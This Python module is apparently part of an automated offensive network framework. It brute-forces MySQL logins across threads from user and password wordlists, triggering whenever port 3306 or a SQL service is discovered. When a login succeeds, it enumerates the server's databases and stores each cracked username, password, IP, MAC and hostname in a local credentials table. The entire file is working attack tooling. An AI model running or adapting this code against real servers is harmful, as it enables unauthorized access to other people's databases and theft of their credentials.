"""sql_bruteforce.py - MySQL bruteforce with per-database credential storage (pymysql)."""

import os
import pymysql
import threading
import logging
import time
from queue import Queue
from typing import List, Dict, Tuple, Optional

from shared import SharedData
from logger import Logger

logger = Logger(name="sql_bruteforce.py", level=logging.DEBUG)

b_class = "SQLBruteforce"
b_module = "sql_bruteforce"
b_status = "brute_force_sql"
b_port = 3306
b_parent = None
b_service = '["sql"]'
b_trigger = 'on_any:["on_service:sql","on_new_port:3306"]'
b_priority = 70  
b_cooldown = 1800            # 30 min between runs
b_rate_limit = '3/86400'     # max 3 per day

class SQLBruteforce:
    """Orchestrator wrapper -> SQLConnector."""

    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.sql_bruteforce = SQLConnector(shared_data)
        logger.info("SQLConnector initialized.")

    def bruteforce_sql(self, ip, port):
        """Run SQL bruteforce for (ip, port)."""
        return self.sql_bruteforce.run_bruteforce(ip, port)

    def execute(self, ip, port, row, status_key):
        """Orchestrator entry point (returns ‘success’ / ‘failed’)."""
        success, results = self.bruteforce_sql(ip, port)
        return 'success' if success else 'failed'


class SQLConnector:
    """Handles SQL (MySQL) attempts, DB persistence, IP->(MAC, Hostname) mapping."""

    def __init__(self, shared_data):
        self.shared_data = shared_data

        self.users = self._read_lines(shared_data.users_file)
        self.passwords = self._read_lines(shared_data.passwords_file)

        # Cache IP -> (mac, hostname)
        self._ip_to_identity: Dict[str, Tuple[Optional[str], Optional[str]]] = {}
        self._refresh_ip_identity_cache()

        self.lock = threading.Lock()
        self.results: List[List[str]] = []  # [ip, user, password, port, database, mac, hostname]
        self.queue = Queue()

    # ---------- file utils ----------
    @staticmethod
    def _read_lines(path: str) -> List[str]:
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                return [l.rstrip("\n\r") for l in f if l.strip()]
        except Exception as e:
            logger.error(f"Cannot read file {path}: {e}")
            return []

    # ---------- mapping DB hosts ----------
    def _refresh_ip_identity_cache(self) -> None:
        self._ip_to_identity.clear()
        try:
            rows = self.shared_data.db.get_all_hosts()
        except Exception as e:
            logger.error(f"DB get_all_hosts failed: {e}")
            rows = []

        for r in rows:
            mac = r.get("mac_address") or ""
            if not mac:
                continue
            hostnames_txt = r.get("hostnames") or ""
            current_hn = hostnames_txt.split(';', 1)[0] if hostnames_txt else ""
            ips_txt = r.get("ips") or ""
            if not ips_txt:
                continue
            for ip in [p.strip() for p in ips_txt.split(';') if p.strip()]:
                self._ip_to_identity[ip] = (mac, current_hn)

    def mac_for_ip(self, ip: str) -> Optional[str]:
        if ip not in self._ip_to_identity:
            self._refresh_ip_identity_cache()
        return self._ip_to_identity.get(ip, (None, None))[0]

    def hostname_for_ip(self, ip: str) -> Optional[str]:
        if ip not in self._ip_to_identity:
            self._refresh_ip_identity_cache()
        return self._ip_to_identity.get(ip, (None, None))[1]

    # ---------- SQL ----------
    def sql_connect(self, adresse_ip: str, user: str, password: str):
        """
        Connect without DB then SHOW DATABASES; returns (True, [dbs]) or (False, []).
        """
        try:
            conn = pymysql.connect(
                host=adresse_ip,
                user=user,
                password=password,
                port=3306
            )
            try:
                with conn.cursor() as cursor:
                    cursor.execute("SHOW DATABASES")
                    databases = [db[0] for db in cursor.fetchall()]
            finally:
                try:
                    conn.close()
                except Exception:
                    pass

            logger.info(f"Successfully connected to {adresse_ip} with user {user}")
            logger.info(f"Available databases: {', '.join(databases)}")
            return True, databases
        except pymysql.Error as e:
            logger.error(f"Failed to connect to {adresse_ip} with user {user}: {e}")
            return False, []

    # ---------- DB upsert fallback ----------
    def _fallback_upsert_cred(self, *, mac, ip, hostname, user, password, port, database=None):
        mac_k = mac or ""
        ip_k = ip or ""
        user_k = user or ""
        db_k = database or ""
        port_k = int(port or 0)

        try:
            with self.shared_data.db.transaction(immediate=True):
                self.shared_data.db.execute(
                    """
                    INSERT OR IGNORE INTO creds(service,mac_address,ip,hostname,"user","password",port,"database",extra)
                    VALUES('sql',?,?,?,?,?,?,?,NULL)
                    """,
                    (mac_k, ip_k, hostname or "", user_k, password or "", port_k, db_k),
                )
                self.shared_data.db.execute(
                    """
                    UPDATE creds
                       SET "password"=?,
                           hostname=COALESCE(?, hostname),
                           last_seen=CURRENT_TIMESTAMP
                     WHERE service='sql'
                       AND COALESCE(mac_address,'')=?
                       AND COALESCE(ip,'')=?
                       AND COALESCE("user",'')=?
                       AND COALESCE(COALESCE("database",""),'')=?
                       AND COALESCE(port,0)=?
                    """,
                    (password or "", hostname or None, mac_k, ip_k, user_k, db_k, port_k),
                )
        except Exception as e:
            logger.error(f"fallback upsert_cred failed for {ip} {user}: {e}")

    # ---------- worker / queue ----------
    def worker(self, success_flag):
        """Worker thread to process SQL bruteforce attempts."""
        while not self.queue.empty():
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping worker thread.")
                break

            adresse_ip, user, password, port = self.queue.get()
            try:
                success, databases = self.sql_connect(adresse_ip, user, password)
                if success:
                    with self.lock:
                        for dbname in databases:
                            self.results.append([adresse_ip, user, password, port, dbname])
                        logger.success(f"Found credentials  IP:{adresse_ip} | User:{user} | Password:{password}")
                        logger.success(f"Databases found: {', '.join(databases)}")
                        self.save_results()
                        self.remove_duplicates()
                        success_flag[0] = True
            finally:
                self.queue.task_done()

                # Optional delay between attempts
                if getattr(self.shared_data, "timewait_sql", 0) > 0:
                    time.sleep(self.shared_data.timewait_sql)


    def run_bruteforce(self, adresse_ip: str, port: int):
        total_tasks = len(self.users) * len(self.passwords)
        if total_tasks == 0:
            logger.warning("No users/passwords loaded. Abort.")
            return False, []

        for user in self.users:
            for password in self.passwords:
                if self.shared_data.orchestrator_should_exit:
                    logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
                    return False, []
                self.queue.put((adresse_ip, user, password, port))

        success_flag = [False]
        threads = []
        thread_count = min(40, max(1, total_tasks))

        for _ in range(thread_count):
            t = threading.Thread(target=self.worker, args=(success_flag,), daemon=True)
            t.start()
            threads.append(t)

        while not self.queue.empty():
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping bruteforce.")
                while not self.queue.empty():
                    try:
                        self.queue.get_nowait()
                        self.queue.task_done()
                    except Exception:
                        break
                break

        self.queue.join()
        for t in threads:
            t.join()

        logger.info(f"Bruteforcing complete with success status: {success_flag[0]}")
        return success_flag[0], self.results

    # ---------- persistence DB ----------
    def save_results(self):
        # For each discovered DB, create/update a row in creds (service='sql', database=<dbname>)
        for ip, user, password, port, dbname in self.results:
            mac = self.mac_for_ip(ip)
            hostname = self.hostname_for_ip(ip) or ""
            try:
                self.shared_data.db.insert_cred(
                    service="sql",
                    mac=mac,
                    ip=ip,
                    hostname=hostname,
                    user=user,
                    password=password,
                    port=port,
                    database=dbname,
                    extra=None
                )
            except Exception as e:
                if "ON CONFLICT clause does not match" in str(e):
                    self._fallback_upsert_cred(
                        mac=mac, ip=ip, hostname=hostname, user=user,
                        password=password, port=port, database=dbname
                    )
                else:
                    logger.error(f"insert_cred failed for {ip} {user} db={dbname}: {e}")
        self.results = []

    def remove_duplicates(self):
        # No longer needed with unique index; kept for compat
        pass


if __name__ == "__main__":
    try:
        sd = SharedData()
        sql_bruteforce = SQLBruteforce(sd)
        logger.info("SQL brute force module ready.")
        exit(0)
    except Exception as e:
        logger.error(f"Error: {e}")
        exit(1)
